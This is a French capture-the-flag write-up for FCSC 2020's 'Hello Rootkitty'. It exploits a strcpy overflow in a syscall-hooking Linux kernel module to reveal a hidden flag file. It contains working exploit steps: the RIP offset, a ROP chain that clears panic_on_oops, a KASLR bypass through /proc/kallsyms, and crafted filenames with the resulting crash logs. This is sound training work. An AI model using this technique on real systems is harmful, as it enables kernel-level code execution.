---
title: "[FR] Write-up FCSC 2020 : Hello Rootkitty"
date: 2020-05-04T18:00:00+02:00
draft: false
tags:
- CTF
- FCSC
- FCSC 2020
---

# I - Intro

Le challenge se compose d'un module Linux pour un kernel `4.14.167 amd64`. Celui-ci est chargé automatiquement dans une VM Qemu accessible via une connexion ssh sur la machine hôte.

# II - Analyse statique et le buffer overflow

Après une analyse statique du binaire avec *Ghidra*, nous remarquons que le module va modifier la table des syscalls et remplacer les syscalls `lstat`, `getdents` et `getdents64`.
Ces versions modifiées des syscalls vont faire appel aux syscalls d'origine et modifier leur retour de manière à masquer les informations à propos des fichiers commençant par `ecsc_flag_`. Le but est donc de trouver un moyen de contourner cette restriction de manière à pouvoir lire le fichier contenant le flag à la racine de la machine.

Après analyse de la version modifiée des syscalls, quelque chose de plutôt important est visible dans `ecsc_sys_getdents` et `ecsc_sys_getdents64`. Lorsque le module va lire ou écrire les noms des fichiers qu'il traite, il utilise la fonction `strcpy` ne possédant pas de protection contre une attaque de type *buffer overflow*. Comme le module ne possède pas de protection à base de *stack cookie*, il est possible d'utiliser un nom de fichier tellement long que l'adresse de retour de la fonction soit modifié nous permettant donc d'exécuter n'importe quel code avec les privilèges du kernel.

En utilisant un simple pattern, on peut facilement trouver quel caractère permet de contrôler `RIP` :

```
~ $ touch ecsc_flag_Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A
c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4A
g5Ag
~ $ ls
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 55 Comm: ls Tainted: G           O    4.14.167 #11
task: ffffa0a441c0a200 task.stack: ffffab2f4009c000
RIP: 0010:0x6441356441346441
RSP: 0018:ffffab2f4009ff38 EFLAGS: 00000282
RAX: 0000000000000548 RBX: 3563413463413363 RCX: 0000000000000000
RDX: 00007fff8b7c75a6 RSI: ffffab2f4009ff93 RDI: 00007fff8b7c74d3
RBP: 3364413264413164 R08: ffffab2f4009fed0 R09: ffffffffc02d2024
R10: ffffab2f4009fec0 R11: 6741346741336741 R12: 634137634136641
R13: 4130644139634138 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffffbcc36000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 000000000124a138 CR3: 0000000001c7e000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x6441356441346441 RSP: ffffab2f4009ff38
---[ end trace 39fccfc1f117da86 ]---
Segmentation fault
```

`RIP` est donc contrôlé par le 102ème caractère.

# III - Création d'une *ROP chain* pour désactiver `oops=panic`

L'un des principal problème rencontré est la présence de l'option `oops=panic` dans la ligne de commande du kernel, cette option provoque un kernel panic au moindre kernel oops or un kernel oops se produit lorsque quelque chose segfault dans le kernel mais que cela n'impactera pas complètement la stabilité du système. Il serait plutôt complexe de réussir à créer un exploit qui retourne dans un état stable sans provoquer un kernel oops, le plus simple reste donc de désactiver l'option `oops=panic` avant d'exécuter l'exploit final.

L'option `oops=panic` est représentée par la [variable globale `panic_on_oops`](https://elixir.bootlin.com/linux/v4.14.167/source/kernel/panic.c#L35), il faudrait donc construire une *ROP chain* permettant de mettre sa valeur à 0. Pour trouver les gadgets à utiliser il faut d'abord extraire le ELF original du kernel car celui-ci est compressé, ici en gzip, `binwalk` permet d'obtenir l'offset des données compressées puis `gunzip` permet de les décompresser.

On peut ensuite utiliser *[ROPGadget](https://github.com/JonathanSalwan/ROPgadget)* pour trouver des gadgets intéressants, voici ceux que j'ai choisi :
```
0xffffffff81269eee : pop rsi ; ret                                  [G1]
0xffffffff8115fac8 : mov dword ptr [rsi], 0 ; xor eax, eax ; ret    [G2]
```
Ils sont plutôt simple a utiliser et ont peux d'effets secondaires. On peut donc construire la *ROP chain* de cette manière :
```py
ropchain = (b"A" * 102) + struct.pack("Q", A_G1) + struct.pack("Q", A_oops) + struct.pack("Q", A_G2) + (b"I"
* 8)
```
Il ne faut pas oublier de prendre en compte l'ASLR du kernel mais celle-ci peut être facilement contrée car ses symboles sont accessibles via `/proc/kallsyms`, il suffit alors de comparer l'adresse de `startup_64` exposée par `kallsyms` avec celle du ELF du kernel.

# IV - Restauration des vrais syscalls

Pour restaurer les vrais syscalls `lstat`, `getdents` et `getdents64`, la méthode la plus simple et d'appeler la fonction `cleanup_module` du module. Les symboles du module sont eux aussi exposés par `kallsyms`.

En combinant ceci avec la *ROP chain* du paragraphe précédant, il est possible de retrouver le nom des fichiers commençant par `ecsc_flag_` :
```
~ $ cat /proc/kallsyms  | head
ffffffff8fe00000 T startup_64
ffffffff8fe00000 T _stext
ffffffff8fe00000 T _text
ffffffff8fe00030 T secondary_startup_64
ffffffff8fe000e0 T verify_cpu
ffffffff8fe001e0 T __startup_64
ffffffff8fe00390 T __startup_secondary_64
ffffffff8fe00398 t sanitize_boot_params.constprop.1
ffffffff8fe00430 t run_init_process
ffffffff8fe00460 t try_to_run_init_process
~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff
\xff\xff\xffIIIIIIII')"
~ $ ls
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 71 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff9a8681e1aa80 task.stack: ffffb9094009c000
RIP: 0010:0x4949494949494949
RSP: 0018:ffffb9094009ff50 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
RDX: 00007ffed4099884 RSI: ffffffff90914bb8 RDI: 00007ffed40997f3
RBP: 4141414141414141 R08: ffffb9094009fed0 R09: ffffffffc01a7024
R10: ffffb9094009fec0 R11: ff8ff5fac8ffffff R12: 4141414141414141
R13: 4141414141414141 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff90836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007ffed40997b0 CR3: 0000000001eae000 CR4: 00000000000006b0
Call Trace:
 ? __kprobes_text_end+0x129b78/0x129b78
Code:  Bad RIP value.
RIP: 0x4949494949494949 RSP: ffffb9094009ff50
---[ end trace 7b7d593635ea5627 ]---
Segmentation fault
~ $ rm "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff\xff
\xff\xffIIIIIIII')"
~ $ ls
~ $ cat /proc/kallsyms | grep ecsc
ffffffffc01a82c8 b ref_sys_getdents64	[ecsc]
ffffffffc01a82d0 b ref_sys_getdents	[ecsc]
ffffffffc01a82c0 b ref_sys_lstat	[ecsc]
ffffffffc01a82e0 b my_sys_call_table	[ecsc]
ffffffffc01a82d8 b original_cr0	[ecsc]
ffffffffc01a636e t ecsc_end	[ecsc]
ffffffffc01a8000 d __this_module	[ecsc]
ffffffffc01a6150 t ecsc_sys_getdents	[ecsc]
ffffffffc01a636e t cleanup_module	[ecsc]
ffffffffc01a62a0 t ecsc_sys_lstat	[ecsc]
ffffffffc01a6000 t ecsc_sys_getdents64	[ecsc]
~ $ touch "$(printf 'ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAnc\x1a\xc0\xff\xff\xff\xff')"
~ $ ls
BUG: unable to handle kernel NULL pointer dereference at           (null)
IP:           (null)
PGD 1e86067 P4D 1e86067 PUD 1e87067 PMD 0
Oops: 0010 [#2] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 84 Comm: ls Tainted: G      D    O    4.14.167 #11
task: ffff9a8681e1b300 task.stack: ffffb9094009c000
RIP: 0010:          (null)
RSP: 0018:ffffb9094009ff40 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 4141414141414141 RCX: ffff9a8681e1b940
RDX: 0000000000000000 RSI: 0000000080000000 RDI: ffffffff9081b4c0
RBP: 4141414141414141 R08: ffff9a8681e1b358 R09: 0000000000000000
R10: ffffb9094009ff20 R11: ffff9a8680033348 R12: 4141414141414141
R13: 4141414141414141 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff90836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000000 CR3: 0000000001eb8000 CR4: 00000000000006b0
Call Trace:
 ? entry_SYSCALL_64_after_hwframe+0x3d/0xa2
Code:  Bad RIP value.
RIP:           (null) RSP: ffffb9094009ff40
CR2: 0000000000000000
---[ end trace 7b7d593635ea5628 ]---
Killed
~ $ ls
ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAnc??????
~ $ cd ..
/home $ ls
ctf
/home $ cd ..
/ $ ls
bin
dev
ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
etc
home
init
lib
mnt
proc
root
run
sys
tmp
var
/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde21166761
26
ECSC{c0d801fb2045ddb0ab27766e52b7654ccde41b5fc00d07fa908fefa30b45b8a5}
```
